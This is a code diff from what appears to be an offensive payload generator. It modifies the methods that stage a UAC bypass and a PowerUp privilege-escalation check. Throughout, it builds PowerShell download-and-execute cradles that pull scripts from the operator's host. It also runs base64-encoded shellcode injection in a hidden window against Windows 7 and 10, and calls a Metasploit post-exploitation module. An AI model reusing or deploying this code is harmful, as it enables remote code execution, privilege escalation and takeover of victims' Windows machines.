@@ -24,19 +24,20 @@ class EXTRAS(object):
             return self.ez2read_shellcode
 
     def UACBYPASS(self, version):
+        from menu import returnIP
         randomPort = FUNCTIONS().randomUnusedPort()
-        uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1"""% (FUNCTIONS().CheckInternet(), randomPort)
+        uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1"""% (returnIP(), randomPort)
         moduleport = FUNCTIONS().randomUnusedPort()
-        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
+        FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
         if version == "7":
             uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
-            FUNCTIONS().CheckInternet(), moduleport, base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
+            returnIP(), moduleport, base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
             a = multiprocessing.Process(target=FUNCTIONS().stagePowershellCode, args=(uacbypassfilecontent, randomPort))
             a.daemon = True
             a.start()
         elif version == "10":
             uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/Invoke-SilentCleanUpBypass.ps1");\nInvoke-SilentCleanUpBypass -Command \"cmd /c powershell -WindowStyle Hidden -enc %s && REM\" """ % (
-            FUNCTIONS().CheckInternet(), moduleport, base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
+            returnIP(), moduleport, base64.b64encode(self.injectshellcode_nosleep.encode('utf_16_le')))
             a = multiprocessing.Process(target=FUNCTIONS().stagePowershellCode, args=(uacbypassfilecontent, randomPort))
             a.daemon = True
             a.start()
@@ -46,11 +47,12 @@ class EXTRAS(object):
             return self.ez2read_shellcode
 
     def ALLCHECKS(self):
+        from menu import returnIP
         moduleport = FUNCTIONS().randomUnusedPort()
-        FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
+        FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
         with open('allchecks.ps1', 'w') as allchecksfile:
             allchecksfile.write(
-                """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/PowerUp.ps1");invoke-allchecks"""%(FUNCTIONS().CheckInternet(), moduleport))
+                """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/PowerUp.ps1");invoke-allchecks"""%(returnIP(), moduleport))
             allchecksfile.close()
             return self.ez2read_shellcode
 
